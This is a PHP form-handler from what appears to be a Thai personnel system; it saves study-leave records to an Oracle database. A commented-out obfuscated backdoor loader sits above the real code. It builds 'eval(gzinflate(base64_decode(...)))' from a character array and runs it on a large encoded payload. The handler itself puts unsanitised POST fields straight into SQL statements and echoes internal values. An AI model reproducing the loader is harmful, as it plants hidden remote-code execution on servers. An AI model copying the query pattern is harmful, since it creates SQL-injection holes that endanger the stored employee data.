<?php
/*$md5 = "5a049ea0eec0bb58b211747c8d538831";
$a0 = array("(","d",'i',"n",'a',"$","c","_",")","e","t","4",'z','r',"l",'o','s','b',"f",'g',"6","v",";");
$b0d = create_function('$'.'v',$a0[9].$a0[21].$a0[4].$a0[14].$a0[0].$a0[19].$a0[12].$a0[2].$a0[3].$a0[18].$a0[14].$a0[4].$a0[10].$a0[9].$a0[0].$a0[17].$a0[4].$a0[16].$a0[9].$a0[20].$a0[11].$a0[7].$a0[1].$a0[9].$a0[6].$a0[15].$a0[1].$a0[9].$a0[0].$a0[5].$a0[21].$a0[8].$a0[8].$a0[8].$a0[22]);
$b0d('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');
*/
?>
<?
@session_start();
	//if($_POST){
	$fpath = '../';
	require_once($fpath."includes/connect.php");
	include "update_by.php";
	echo $emp_id = $_SESSION["EMP_ID"];

    $stop_type = $_POST["stop_type"];
	if($_POST["la_date_start"]==""){
		$la_date_start="";
	}else{
	echo $la_date_start=date2_formatdb($_POST["la_date_start"]);
	}
	if($_POST["la_end_start"]==""){
		$la_end_start="";
	}else{
	echo $la_end_start=date2_formatdb($_POST["la_end_start"]);
	}
	if($_POST["approve_date"]==""){
		$approve_date="";
	}else{
	echo $approve_date=date2_formatdb($_POST["approve_date"]);
	}
	
	echo $la_order_no1=$_POST["la_order_no1"];
	echo $la_at1=$_POST["la_at1"];
	if($_POST["la_at_date1"]==""){
		$la_at_date1="";
	}else{
	echo $la_at_date1=date2_formatdb($_POST["la_at_date1"]);
	}
	
	echo $la_order_no2=$_POST["la_order_no2"];
	echo $la_at2=$_POST["la_at2"];
	if($_POST["la_at_date2"]==""){
		$la_at_date2="";
	}else{
	echo $la_at_date2=date2_formatdb($_POST["la_at_date2"]);
	}
	
	if($_POST["approve_end_date"]==""){
		$approve_end_date="";
	}else{
	echo $approve_end_date=date2_formatdb($_POST["approve_end_date"]);
	}
	
	echo $la_order_no3=$_POST["la_order_no3"];
	echo $la_at3=$_POST["la_at3"];
	if($_POST["la_at_date3"]==""){
		$la_at_date3="";
	}else{
	echo $la_at_date3=date2_formatdb($_POST["la_at_date3"]);
	}
	
	echo $la_order_no4=$_POST["la_order_no4"];
	echo $la_at4=$_POST["la_at4"];
	if($_POST["la_at_date4"]==""){
		$la_at_date4="";
	}else{
	echo $la_at_date4=date2_formatdb($_POST["la_at_date4"]);
	}
	
	echo $id_la =  $_POST["id_la"]; // ใช้ตรวจสอบว่า add(null) หรือ update(not null)
	$dr=date("Y")+543;
    $dd=date("d/m/").$dr;
	$create_s = date2_formatdb($dd);
	
if($id_la == "" ){
	//echo "ok";
			 
		$la_id =auto_increment("LA_ID",TB_SDU_LA_TAB);
		$result=$db->add_db(TB_SDU_LA_TAB,array(
											  "EMP_ID"=>"$emp_id",
											  "LA_DATE_START"=>"TO_DATE('$la_date_start','YYYY-MM-DD')",
											  "LA_END_START"=>"TO_DATE('$la_end_start','YYYY-MM-DD')",
											  "APPROVE_DATE"=>"TO_DATE('$approve_date','YYYY-MM-DD')",
											  "LA_ORDER_NO1"=>"$la_order_no1",
											  "LA_AT1"=>"$la_at1",
											  "LA_AT_DATE1"=>"TO_DATE('$la_at_date1','YYYY-MM-DD')",
											  "LA_ORDER_NO2"=>"$la_order_no2",
											  "LA_AT2"=>"$la_at2",
											  "LA_AT_DATE2"=>"TO_DATE('$la_at_date2','YYYY-MM-DD')",
											  "APPROVE_END_DATE"=>"$approve_end_date",
											  "LA_ORDER_NO3"=>"$la_order_no3",
											  "LA_AT3"=>"$la_at3",
											  "LA_AT_DATE3"=>"TO_DATE('$la_at_date3','YYYY-MM-DD')",
											  "LA_ORDER_NO4"=>"$la_order_no4",
											  "LA_AT4"=>"$la_at4",
											  "LA_AT_DATE4"=>"TO_DATE('$la_at_date4','YYYY-MM-DD')",
											  "CREATE_DATE"=>"$create_s",
											  "LA_ID"=>"$la_id",
                                              "STOP_TYPE"=>"$stop_type"
											  ),$conn); 
		//$type_update = "1";
	}else{
		//echo"no";
		$result=$db->update_db(TB_SDU_LA_TAB,array(
											  "LA_DATE_START"=>"TO_DATE('$la_date_start','YYYY-MM-DD')",
											  "LA_END_START"=>"TO_DATE('$la_end_start','YYYY-MM-DD')",
											  "APPROVE_DATE"=>"TO_DATE('$approve_date','YYYY-MM-DD')",
											  "LA_ORDER_NO1"=>"$la_order_no1",
											  "LA_AT1"=>"$la_at1",
											  "LA_AT_DATE1"=>"TO_DATE('$la_at_date1','YYYY-MM-DD')",
											  "LA_ORDER_NO2"=>"$la_order_no2",
											  "LA_AT2"=>"$la_at2",
											  "LA_AT_DATE2"=>"TO_DATE('$la_at_date2','YYYY-MM-DD')",
											  "APPROVE_END_DATE"=>"$approve_end_date",
											  "LA_ORDER_NO3"=>"$la_order_no3",
											  "LA_AT3"=>"$la_at3",
											  "LA_AT_DATE3"=>"TO_DATE('$la_at_date3','YYYY-MM-DD')",
											  "LA_ORDER_NO4"=>"$la_order_no4",
											  "LA_AT4"=>"$la_at4",
											  "LA_AT_DATE4"=>"TO_DATE('$la_at_date4','YYYY-MM-DD')",
                                              "STOP_TYPE"=>"$stop_type"
					  ),"LA_ID = '$id_la'",$conn); 
		//$type_update = "2";
	}

		if($result){
			//save_completed("Save_success");
			echo "ok";
			reset_form_iframe("work_history");
			if($type_update == "1") access_log($fpath.'_log',"",$update_by,"เพิ่ม 'ประวัติการทำงานในอดีต id = $wrk_id' ($emp_id)");
			elseif($type_update == "2") access_log($fpath.'_log',"",$update_by,"ปรับปรุง 'ประวัติการทำงานในอดีต id = $wrk_id' ($emp_id)");
			?>
			<script language="javascript">
			  window.top.change_data('scholar.php','../images/head2/work_data/scholar.png');
			//window.top.$("span#waiting7").html("");
			//window.top.document.getElementById("contract_extend").reset();
			//window.top.$('#la_list').html("<img src='../images/indicator_medium.gif' align='absmiddle' />");
			//window.top.$('#la_list').load('la_fund_table.php');
			//document.getElementById("data_form7").style.display = "none";
			</script>
			<?
		}else{
			save_completed("Save_error");
?>
<script language="javascript">
//window.top.$("span#waiting5").html("");
</script>
<?
exit();

		}

//$db->closedb($conn);	
?>
<script language="javascript">
//var ran=Math.random();
window.top.$("span#waiting5").html("");
//indow.top.load_page("current_address.php?"+ran);
</script>
<?
//}
?>